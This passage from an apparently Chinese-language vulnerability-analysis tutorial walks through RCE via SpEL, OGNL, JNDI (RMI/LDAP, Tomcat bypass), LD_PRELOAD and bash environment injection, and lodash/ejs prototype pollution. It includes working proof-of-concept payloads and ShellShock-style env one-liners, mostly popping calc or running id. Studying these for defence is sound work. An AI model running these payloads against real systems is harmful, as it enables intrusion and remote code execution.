[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169316660-c46f4ed1-4dcc-49c4-9c16-ee7587c26fee.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169316660-c46f4ed1-4dcc-49c4-9c16-ee7587c26fee.png)

向上跟踪，看看哪里调用了 getValue，定位到 normalize，遍历 args 参数并取值给 entry，然后传进 getvalue

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169316686-70221583-8d13-4939-b5f1-88ab0997e894.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169316686-70221583-8d13-4939-b5f1-88ab0997e894.png)

那么继续看 normalize 中的 args 是从哪里来的，找到 ConfigurationService.java 文件，先判断是不是 null，如果不是的话就赋值，如果是的话就执行 normalizeProperties，在赋值时发现传的值是 this.properties

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169316689-c692e103-3747-47bd-a58a-450b8151b682.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169316689-c692e103-3747-47bd-a58a-450b8151b682.png)

赋值在 properties

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169316695-8d8296ff-c958-4c0c-a3a6-c1d1dc128420.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169316695-8d8296ff-c958-4c0c-a3a6-c1d1dc128420.png)

那么哪里调用 properties 呢？在 RouteDefinitionRouteLocator.java 中的 loadGatewayFilters 中，在 126 行中给 definition 赋值后传入 properties，继续定位

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169317642-7e0ab8e2-c46c-4697-bdbb-eaf69ca2eb4c.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169317642-7e0ab8e2-c46c-4697-bdbb-eaf69ca2eb4c.png)

哪里调用 loadGatewayFilters 了呢，继续跟进发现是在 getFilters，而 loadGatewayFilters 中第二个参数就是我们传参的 exp

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169317844-f268c1fd-208b-4da2-a4d9-b7d3b6686093.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169317844-f268c1fd-208b-4da2-a4d9-b7d3b6686093.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169317842-0ebd4ece-aa4a-49cd-9622-c3e8214371c9.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169317842-0ebd4ece-aa4a-49cd-9622-c3e8214371c9.png)

然后回到起始点，在 AbstractGatewayControllerEndpoint.java 中

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169318444-28364600-72a9-4d42-932c-bf45efcddda7.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169318444-28364600-72a9-4d42-932c-bf45efcddda7.png)

文档中也说明了创建路由的方式

[https://cloud.spring.io/spring-cloud-gateway/multi/multi__actuator_api.html](https://cloud.spring.io/spring-cloud-gateway/multi/multi__actuator_api.html)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169318471-ecef1cd9-59f6-4ee1-8c39-c435fb2876f0.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169318471-ecef1cd9-59f6-4ee1-8c39-c435fb2876f0.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169319441-827bdc8f-ba7d-4abf-9d37-05287bb2048c.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169319441-827bdc8f-ba7d-4abf-9d37-05287bb2048c.png)

跟进 validateRouteDefinition 中的 isAvilable，这段代码就是来检查过滤器是否是可用的，只需选择可用的过滤器即可 RCE

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169319662-a53842bc-962b-4bd3-ad74-2fb5bcf809f3.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169319662-a53842bc-962b-4bd3-ad74-2fb5bcf809f3.png)

总结就是需要用户自己创建一个路由，refresh 之后即可成功触发 RCE 的流程，最后用户传入的 poc 由 parser.parseExpression 进行解析，造成 spel 注入，网上文章有更详细的流程，如要继续深入的话可以再搜一下

### **4.3.2 表达式注入（OGNL）**

OGNL（Object-Graph Navigation Language）表达式注入是一种安全漏洞，通常发生在使用 Apache Struts 等框架的 Web 应用程序中。OGNL 是一种强大的表达式语言，用于获取和设置 Java 对象的属性，执行方法调用等。在 Apache Struts 框架中，OGNL 用于视图层与后端 Java 代码之间的数据绑定和表达式求值。

下面是个小案例

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169319678-61e4e329-217b-47b2-a2f3-a33db723b810.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169319678-61e4e329-217b-47b2-a2f3-a33db723b810.png)

import ognl.Ognl;import ognl.OgnlContext;public class OGNL {public static void main(String[] args) throws Exception { String poc = "@java.lang.Runtime@getRuntime().exec(\"calc\")"; OgnlContext context = (OgnlContext) Ognl.createDefaultContext(OGNL.class); context.put("test", "test"); Object expression = Ognl.parseExpression(poc); Ognl.getValue(expression, context, context.getRoot()); \}\}

简单进行下原理分析

最终的漏洞点在 getValue 中，那么我们深入分析下这个函数都做了些什么事情

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169320084-ee381912-8ee6-46c6-a59a-bb6dcab2ce41.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169320084-ee381912-8ee6-46c6-a59a-bb6dcab2ce41.png)

这段代码大致意思是从一个对象树中获取值，根据节点是否有访问器采取不同方式提取信息

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169319932-4504c85d-a279-4c0d-aeb9-35170d6dbf1f.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169319932-4504c85d-a279-4c0d-aeb9-35170d6dbf1f.png)

跟进 node.getValue 后会发现调用了 evaluateGetValueBody

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169321217-b26bf63f-b04f-4518-be09-1758dea5f3a8.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169321217-b26bf63f-b04f-4518-be09-1758dea5f3a8.png)

这段代码首先检查一个节点是否已经计算了一个常量值，如果没有，则计算并标记它。如果存在的话就返回这个常量值，如果不存在，就计算并返回一个新值

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169321348-49fa77da-0ba4-430c-8ca0-1292d7e1088a.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169321348-49fa77da-0ba4-430c-8ca0-1292d7e1088a.png)

进入 getValueBody 进行计算

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169321392-3554c326-431d-4a64-b438-c4b13f6c4df9.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169321392-3554c326-431d-4a64-b438-c4b13f6c4df9.png)

最后通过迭代计算后将我们的 poc 传入 callMethod 进行调用

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169321491-86cd1468-a078-4c55-ad61-b7c66fdfa573.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169321491-86cd1468-a078-4c55-ad61-b7c66fdfa573.png)

**4.4 (JAVA)JNDI 注入导致 RCE**
---------------------------

JNDI 注入（Java Naming and Directory Interface 注入）是一种利用 Java 平台的命名和目录接口进行攻击的安全漏洞。这种攻击通常发生在当应用程序将用户输入未经验证直接用于 JNDI 查询时。攻击者可以通过构造恶意的输入，实现对目标系统的远程代码执行（RCE），数据泄露或其他恶意活动。JNDI 是一个 Java API，它提供了一个查找和访问 Java 命名和目录服务的方法。

### **4.4.1 JNDI 注入 + RMI**

RMI(remote method invoke) 即远程方法调用，JAVA 中的 RMI 可以使一个 JVM 中的对象，调用另一个 JVM 中的对象方法并获取调用结果。

RMI 包含客户端和服务端，在服务端中生成远程对象并绑定到注册中心中，客户端可以从注册中心中查找到远程对象并调用其中的方法。

比如想将 UserService 注册为远程对象，首先需要写一个接口并继承 Remote。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169321672-a203f6ea-de04-47ec-8c58-f9c2460e3c9e.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169321672-a203f6ea-de04-47ec-8c58-f9c2460e3c9e.png)

UserService 实现类需要继承 UnicastRemoteObject 并抛出 RemoteException 异常。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169322420-829698de-bc3f-4852-99bd-51c619a2f011.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169322420-829698de-bc3f-4852-99bd-51c619a2f011.png)

获取注册中心，向注册中心绑定 userService 的 url 为 rmi://localhost:1900/user，会开启在 1900 端口开启一个 RMI 服务。

​ [![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169322517-e74d030b-023e-42a7-a439-2dc3416f6e00.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169322517-e74d030b-023e-42a7-a439-2dc3416f6e00.png)

客户端通过注册中心绑定的命名获取到远程对象完成调用。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169322521-7cadb539-798b-47c9-b8a0-f79f4ad43421.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169322521-7cadb539-798b-47c9-b8a0-f79f4ad43421.png)

RMI 除了可以直接绑定对象，也支持绑定 Reference 引用对象，Reference 构造方法中包含三个参数，分别是 className，factory，和 factoryLoaction。当通过 rmi 请求引用对象时，会从 factoryLocation 指定的位置获取名字为 factory 指定的工厂类，并调用工厂类的 getObjectInstance 方法获取对象。如果 RMI 的服务端可控，可以绑定一个恶意的 Reference 应用对象，同时指定 factoryLoaction 的地址为服务端地址等待客户端连接。当客户端向恶意 RMI 服务器发起请求查找引用对象时，如果本地找不到工厂类时，则会根据 factoryLocation 提供地址加载远程的恶意 Class 从而实现 RCE。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169322579-0039b05f-49f4-4ae9-8ac6-0f6c4032a845.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169322579-0039b05f-49f4-4ae9-8ac6-0f6c4032a845.png)

**漏洞复现：**

创建 RMI 服务端在 1099 端口创建注册中心后，创建引用对象并指定 factoryLoaction 为 [http://127.0.0.1:8888/className 为 Calc。最后将引用对象绑定在注册中心。](http://127.0.0.1:8888/className%E4%B8%BACalc%E3%80%82%E6%9C%80%E5%90%8E%E5%B0%86%E5%BC%95%E7%94%A8%E5%AF%B9%E8%B1%A1%E7%BB%91%E5%AE%9A%E5%9C%A8%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E3%80%82)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169322640-6c9deb40-1361-416c-a90f-9d27130a3004.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169322640-6c9deb40-1361-416c-a90f-9d27130a3004.png)

编写恶意代码实现 ObjectFactory 接口，在静态方法中实现恶意代码。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169323447-62b8e666-c93d-4678-a64c-9b6d1e5257c3.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169323447-62b8e666-c93d-4678-a64c-9b6d1e5257c3.png)

在 127.0.0.1:8888 端口开启 http 服务并将编译后的 Calc.class 放到 http 服务的根目录下。

JNDI 通过 rmi 协议向注册中心发起请求查询绑定的引用对象，加载远程 Class 实现 RCE。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169323496-3aa8e4f3-f00e-469f-a1d1-0c4225104fd6.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169323496-3aa8e4f3-f00e-469f-a1d1-0c4225104fd6.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169323490-7ccb0cb5-fb2a-47d8-9e16-0310465d08f9.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169323490-7ccb0cb5-fb2a-47d8-9e16-0310465d08f9.png)

**原理分析：**

由于使用的高版本 JDK 复现，因此在客户端加上两行代码。

System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");  
System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");

JDK 6u141、7u131、8u121 之后：增加了 com.sun.jndi.rmi.object.trustURLCodebase 选项，默认为 false，也就是说在这些 JDK 版本之后，默认无法加载远程的。

JDK 6u211、7u201、8u191 之后：增加了 com.sun.jndi.ldap.object.trustURLCodebase 选项，默认为 false，禁止 LDAP 协议使用远程 codebase 的选项。

下面看一下 JNDI 通过 RMI 利用的请求过程。

客户端通过 context.lookup 发起请求，首先调用 getURLOrDefaultInitCtx() 根据协议来获取不同的 Context 实例。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169323618-01aaca09-9744-4615-a502-e32bd17cd5be.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169323618-01aaca09-9744-4615-a502-e32bd17cd5be.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169323645-5b38dc79-6271-47ca-9a00-d20e9f9b666a.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169323645-5b38dc79-6271-47ca-9a00-d20e9f9b666a.png)

继续调用 GenericURLContext#lookup 根据 url 获取注册中心上下文，调用 lookup 方法从注册中心上下文中查找对象。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169324212-3402a477-c291-4b23-ae48-eb91db7fa5d4.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169324212-3402a477-c291-4b23-ae48-eb91db7fa5d4.png)

RegistryContext#lookup 从注册中心查找对象后调用 decodeObject 对 lookup 找到的 Remote 对象解码。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169324282-081c20bc-3847-423e-b10d-73b237209e20.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169324282-081c20bc-3847-423e-b10d-73b237209e20.png)

decodeObject 中判断是否为引用对象，这里通过代码可以看到，当查找结果是引用对象，并且设置了 factoryLoaction 时，会检查 trustURLCodebase 是否为 true，如果不是则直接抛出异常，因此想要通过 RMI 协议加载 factoryLocation 中指定的 class 需要设置 com.sun.jndi.rmi.object.trustURLCodebase 为 true。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169324380-11957e6a-3fc6-4ace-9731-f5e078f91744.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169324380-11957e6a-3fc6-4ace-9731-f5e078f91744.png)

下面看 getObjectInstance 的代码逻辑，首先获取 ObjectFactoryBuilder，如果存在则通过 ObjectFactoryBuilder 构造 factory。不存在则查看引用对象是否设置了 FactroyClassName，调用 getObjectFactoryFromReference 获取工厂对象。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169324453-b3c38955-6db0-44d5-88a8-822ee49a80a0.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169324453-b3c38955-6db0-44d5-88a8-822ee49a80a0.png)

getObjectFactoryFromReference 首先从本地加载 Class，加载不到再去 FactoryLocation 中加载 class。加载到 class 后通过 newInstance 实例化。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169324515-07e2e552-d8a1-4819-9e82-c6b32f5722a9.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169324515-07e2e552-d8a1-4819-9e82-c6b32f5722a9.png)

远程类加载通过 VersionHelper12#loadClass 完成，这里又会判断 trustURLCodebase 是否为 true，只有为 true 才会创建 UrlClassLoader 加载远程 Class。因此还需要设置 com.sun.jndi.ldap.object.trustURLCodebase 为 true。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169325120-4d0fb8c3-7de8-4881-bc4f-183fa46562c8.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169325120-4d0fb8c3-7de8-4881-bc4f-183fa46562c8.png)

可以看到 JNDI+RMI 利用需要依赖 JDK 的版本限制，那么有没有方法绕过呢？

**Tomcat Bypass**

通过上面对于 JNDI+RMI Client 查找引用对象的过程，我们发现了两种绕过思路。

1.  可以调用 System.setProperty 对属性进行设置。
2.  查找本地代码中是否有可以利用的 ObjectFactory。

第一种绕过方法比较困难，除非存在一个任意静态方法调用，否则无法绕过。

第二种方法需要从一些通用库中寻找 ObjectFactory 实现类，并寻找可以利用的点。

在 tomcat 中存在 org.apache.naming.factory.BeanFactory 类，其中 getObjectInstance 方法会从引用对象中获取 ClassName,Method 和参数，因此可以利用该类实现任意方法调用从而实现 RCE。

// 代码引用：[https://evilpan.com/2021/12/13/jndi-injection/#remote-class](https://evilpan.com/2021/12/13/jndi-injection/#remote-class)

public Object getObjectInstance(Object obj, Name name, Context nameCtx,

Hashtable<?,?> environment)

throws NamingException {

Reference ref = (Reference) obj;

String beanClassName = ref.getClassName();

ClassLoader tcl = Thread.currentThread().getContextClassLoader();

// 1. 反射获取类对象

if (tcl != null) {

beanClass = tcl.loadClass(beanClassName);

} else {

beanClass = Class.forName(beanClassName);

}

// 2. 初始化类实例

Object bean = beanClass.getConstructor().newInstance();

// 3. 根据 Reference 的属性查找 setter 方法的别名

RefAddr ra = ref.get("forceString");

String value = (String)ra.getContent();

// 4. 循环解析别名并保存到字典中

for (String param: value.split(",")) {

param = param.trim();

index = param.indexOf('=');

if (index>= 0) {

setterName = param.substring(index + 1).trim();

param = param.substring(0, index).trim();

} else {

setterName = "set" +

param.substring(0, 1).toUpperCase(Locale.ENGLISH) +

param.substring(1);

}

forced.put(param, beanClass.getMethod(setterName, paramTypes));

}

// 5. 解析所有属性，并根据别名去调用 setter 方法

Enumeration<refaddr> e = ref.getAll();</refaddr>

while (e.hasMoreElements()) {

ra = e.nextElement();

String propName = ra.getType();

String value = (String)ra.getContent();

Object[] valueArray = new Object[1];

Method method = forced.get(propName);

if (method != null) {

valueArray[0] = value;

method.invoke(bean, valueArray);

}

// ...

}

}

通过 Tomcat Bypass 构造 EXP 如下：

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169325232-4f2d9de0-f39e-4510-bab9-805326b9b774.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169325232-4f2d9de0-f39e-4510-bab9-805326b9b774.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169325277-8ebf08f7-0235-455b-aaab-397bb71b396c.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169325277-8ebf08f7-0235-455b-aaab-397bb71b396c.png)

### **4.4.2 JNDI 注入 + LDAP**

JNDI 常用的协议还有 ldap 协议，通过 ldap 协议也可以指定 codeBase 来实现 RCE。在 JDK 高版本中同样受到 com.sun.jndi.ldap.object.trustURLCodebase 属性的影响。因此关于 ldap 协议的利用第一种方法与 RMI 类似，同样也可以通过 Tomcat bypass 绕过 JDK 版本限制。但 ldap 协议中可以绑定 javaSerializedObject 对象在服务端，在 javaSerializedObject 对象中有 javaSerializedData 属性可以存储序列化的内容，客户端在请求时会对 javaSerializedData 的内容反序列化从而触发反序列化漏洞。

对应的代码在 LdapCtx#c_lookup 中，javaClassName 不为空时调用 decodeObject 方法。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169325245-62f36708-4e38-4c87-bf30-9baa5006d9d3.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169325245-62f36708-4e38-4c87-bf30-9baa5006d9d3.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169325374-1c0de46e-cf4d-4648-bdba-7686c1cd782b.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169325374-1c0de46e-cf4d-4648-bdba-7686c1cd782b.png)

javaSerializedData 不为空时，通过 codebase 获取 ClassLoader，classLoader 为空根据 javaSerializedData 属性的内容创建 ObjectInputStream 并调用 readObject 方法触发反序列化。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169326109-518ac662-212d-472d-bbbe-0aaea0493c1e.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169326109-518ac662-212d-472d-bbbe-0aaea0493c1e.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169326171-07d34558-823a-4840-bf03-8e73328c5ac4.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169326171-07d34558-823a-4840-bf03-8e73328c5ac4.png)

由于 Ldap 利用方式更多且限制更少，因此一般在发现 JNDI 注入时优先选择通过 Ldap 来利用。

4.5 环境变量注入 RCE
--------------

环境变量是操作系统中用来定义操作系统运行环境的一些变量。它们包含了关于操作系统会话和工作环境的信息，如路径设置、系统语言、临时文件夹位置等。环境变量可以被系统的进程和应用程序读取，用来获取关键的配置信息和系统参数

环境变量注入，一种是常见的通过 LD_PRELOAD 和上传任意. so 文件进行 rce，另一种是 p 牛写的通过环境变量可控和一个不可控的命令执行进行 RCE

### **4.5.1 环境变量注入（LD_PRELOAD）**

LD_PRELOAD 是一个在 Unix-like 操作系统中使用的环境变量，它允许用户指定在程序启动前预加载的共享库（shared libraries）。这个特性通常用于改变已有程序的行为，而无需修改程序本身的代码。

通过 LD_PRELOAD，可以强制加载用户指定的库文件，这些库文件中的函数可以覆盖标准库中的同名函数，从而允许重定义函数的行为。

当设置了 LD_PRELOAD 环境变量后，动态链接器（dynamic linker/loader）会在程序启动时，优先加载 LD_PRELOAD 中指定的共享库。这些库中的函数将优先于标准库或其他共享库中的同名函数被使用。这意味着，即使应用程序没有直接链接到这些预加载的库，程序中对这些函数的调用也会被重定向到预加载的库中的实现。

在 Linux 下，动态链接库是. so(Shared Object) 为扩展名的文件。它在许多方面与 windows 中的 dll 文件类似。

编写. c 文件代码

#include <stdlib.h>

#include <unistd.h>

#include <sys/types.h>

**attribute**((constructor)) void rcetest(void){

unsetenv("LD_PRELOAD");

system("echo RCE successfully");

}

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169326209-2793bac2-9044-4827-aef2-7bdda90fcb5b.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169326209-2793bac2-9044-4827-aef2-7bdda90fcb5b.png)

生成后编写 php 文件代码，使用 putenv 控制 LD_PRELOAD

<?php

putenv("LD_PRELOAD=./rcetest.so");

system("id");

?>

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169326260-c5fa6dc4-e0c6-4118-85ab-7d379c3f5e0a.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169326260-c5fa6dc4-e0c6-4118-85ab-7d379c3f5e0a.png)

### **4.5.2 环境变量注入（环境变量可控与不可控的命令执行）**

根据 p 牛研究，发现在特殊环境（例如 centos7）下，通过可控的 putenv 参数与一个不可控的命令执行函数即可成功造成 rce，具体原理可以看下 p 牛博客写的分析，这里就简单复现下，不班门弄斧了。

[https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html](https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html)

简单做个测试，在 centos7 下可以使用以下代码执行任意命令

<?php

if(isset($argv[1])) {

putenv($argv[1]);

}

system('echo hello');

?>

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169326425-11dc0f26-b844-4c37-80fd-4408f9fbfb9a.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169326425-11dc0f26-b844-4c37-80fd-4408f9fbfb9a.png)

以下为 p 牛总结

Bash 没有修复 ShellShock 漏洞：直接使用 ShellShock 的 POC 进行测试，例如 TEST=() { :;}; id;

Bash 4.4 以前：env $'BASH_FUNC_echo()=() { id; }' bash -c "echo hello"

Bash 4.4 及以上：env $'BASH_FUNC_echo%%=() { id;}' bash -c 'echo hello'

BASH_ENV：可以在 bash -c 的时候注入任意命令

ENV：可以在 sh -i -c 的时候注入任意命令 PS1：可以在 sh 或 bash 交互式环境下执行任意命令 PROMPT_COMMAND：可以在 bash 交互式环境下执行任意命令

BASH_FUNC_xxx%%：可以在 bash -c 或 sh -c 的时候执行任意命令

**4.6 (Javascript) 原型链污染 RCE**
------------------------------

在 JavaScript 中，每个对象都有一个原型（prototype），原型是对象的属性和方法的集合。当试图访问一个对象的属性或方法时，如果对象本身没有这个属性或方法，JavaScript 引擎会在对象的原型链上查找。原型链是一系列对象的链式结构，当一个对象无法找到所需的属性或方法时，它会沿着原型链向上查找，直到找到为止。

原型链污染漏洞（Prototype Pollution Vulnerability）通常发生在开发者未正确验证用户输入时，将恶意数据注入到 JavaScript 对象的原型链上。攻击者可以利用这种漏洞来修改全局对象的属性或方法，最后导致恶意漏洞。

安装所需环境 (因为这几个版本存在漏洞，不加—no-audit 是下载不了的)

Npm install express –no-audit

Npm install lodash@4.17.4–no-audit

Npm install ejs@3.1.6–no-audit

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169326936-24ffe5c4-b8fb-4e04-a1ad-bfb22382a02a.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169326936-24ffe5c4-b8fb-4e04-a1ad-bfb22382a02a.png)

简单讲下 Prototype（原型）和 Proto (**proto**) 用法

1.  构造函数的 prototype 属性：每个 JavaScript 函数都有一个 prototype 属性，它是一个指向原型对象的指针。通过给这个 prototype 对象添加属性和方法，可以实现在该构造函数创建的对象之间共享属性和方法。

2 **proto** 属性：**proto** 是每个对象都有的一个属性，它指向该对象的原型。

var obj1 = {};var obj2 = {};obj2.**proto** = obj1;// 现在 obj2 的原型是 obj1

生成案例代码

简单解析一下

outputFunctionName 是在这个 **proto** 这个特殊属性所指向的原型对象上自定义的属性。

global 是 Node.js 中全局对象，类似于浏览器中的 window 对象。process 是 Node.js 中用于控制当前进程的对象。mainModule 是 process 对象的一个属性，它指向主模块，即启动应用程序的脚本文件。require('child_process') 就是老熟人了，用来执行具体命令的模块

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169327036-c3f139ba-4e33-4e72-b5ef-4c7155a5e6be.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169327036-c3f139ba-4e33-4e72-b5ef-4c7155a5e6be.png)

访问站点即可成功 RCE

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169326863-0651dbce-117f-4f46-9622-0a77f411baef.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169326863-0651dbce-117f-4f46-9622-0a77f411baef.png)

前期污染使用的是

lodash.merge({}, JSON.parse(malicious_payload));

篇幅原因我这里就只跟进 RCE 了，最后漏洞点是在 node_modules\lodash_baseAssignValue.js 中，感兴趣的可以自己在 lodash.merge 中打上断点

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169327335-8f56a048-e4b2-4d51-85f2-2064df7222c9.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169327335-8f56a048-e4b2-4d51-85f2-2064df7222c9.png)

代码分析

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169327405-e9e3aa48-159f-44e7-b573-1d1ff9bd74dd.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169327405-e9e3aa48-159f-44e7-b573-1d1ff9bd74dd.png)

跟进 render

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169327771-d1f5dd87-8296-4d1d-89c5-1fbcb003dfdb.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169327771-d1f5dd87-8296-4d1d-89c5-1fbcb003dfdb.png)

进入 render 函数中，跟进最后一行 tryRender

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169327822-a1062c33-94bf-4a92-b298-76e91faa22c0.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169327822-a1062c33-94bf-4a92-b298-76e91faa22c0.png)

继续跟进 view.render

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169328030-3413fafe-67fe-43c1-98c8-fe43eef8267a.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169328030-3413fafe-67fe-43c1-98c8-fe43eef8267a.png)

此时跟进 ejs.js 中的 renderFile，在最后一行跟进 tryHandleCache

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169328144-69ab254a-775d-470e-acac-215f7cd489fb.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169328144-69ab254a-775d-470e-acac-215f7cd489fb.png)

进入后再 272 行继续跟进 handleCache，此时的 data 和 options 都有我们的 payload

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169328424-466843ca-6755-4306-99ad-f871a3e6e4ca.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169328424-466843ca-6755-4306-99ad-f871a3e6e4ca.png)

跟进 compile 函数，然后会 new 一个 Template 类

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169328870-759d556c-a132-4165-b508-ca4ac392c186.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169328870-759d556c-a132-4165-b508-ca4ac392c186.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169329027-3ea4e2ca-a0e0-4a6e-9101-445e4fb6cca0.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169329027-3ea4e2ca-a0e0-4a6e-9101-445e4fb6cca0.png)

此时将之前所有的 opt 参数赋值给 options

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169329131-7e309f66-af76-4aaa-8bab-f4eee5be07b3.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169329131-7e309f66-af76-4aaa-8bab-f4eee5be07b3.png)

退出 Template 类，回到 compile 函数中

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169329484-0a93afb2-b241-46da-91af-76922978f032.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169329484-0a93afb2-b241-46da-91af-76922978f032.png)

此时将 opts.outputFunctionName 的值给 prepended 加上

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169330003-830308af-670a-42b6-a0e2-00a1850cda2a.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169330003-830308af-670a-42b6-a0e2-00a1850cda2a.png)

此时的 prepended 值为

" var **output = \"\";\n function** append(s) { if (s !== undefined && s !== null) **output += s }\n var _tmp1;global.process.mainModule.require('child_process').exec('calc');var** tmp2 = __append;\n with (locals || {}) {\n"

